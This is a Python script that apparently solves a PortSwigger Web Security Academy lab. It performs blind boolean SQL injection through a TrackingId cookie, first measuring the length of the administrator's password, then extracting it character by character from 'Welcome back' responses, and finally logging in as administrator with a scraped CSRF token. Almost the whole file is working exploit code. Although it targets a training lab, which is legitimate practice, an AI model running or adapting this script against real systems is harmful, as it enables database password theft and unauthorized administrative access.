import requests
from time import sleep
from bs4 import BeautifulSoup
url = "https://ac551fd21f312880c038698400010027.web-security-academy.net/login"
s = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
number = 1
session = requests.Session()
response = session.get(url)
track = session.cookies.get_dict()["TrackingId"]
trackingID = track + "\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
for a in range(1,40):
    trackingID = track + "\' AND (SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)>" + str(number) + ")=\'a"
    response = requests.get(url, cookies={'TrackingId': trackingID})
    if "Welcome back" in response.text:
        number += 1
print("length of admin password found = "+str(number))
password = ""
for num in range(1,number+1):
    for letter in s:
        trackingID = track + "\' AND (SELECT SUBSTRING(password,"+str(num)+",1) FROM users WHERE username=\'administrator\')=\'"+letter
        sleep(0.1)
        response = requests.get(url, cookies={'TrackingId': trackingID})
        if "Welcome back" in response.text:
            print(letter)
            password += letter;
print("admin password found: ")
print(password)
session = requests.session()
resp1 = session.get(url).text
soup = BeautifulSoup(resp1, "html.parser")
csrf = soup.find('input', {'name': 'csrf'})['value']
response = session.post(url, data={"username": "administrator", "password": password, "csrf": csrf})
if "logout" in response.text:
    print("challenge solved")
else:
    print("something does not work, incorrect data")
    print(response.text)

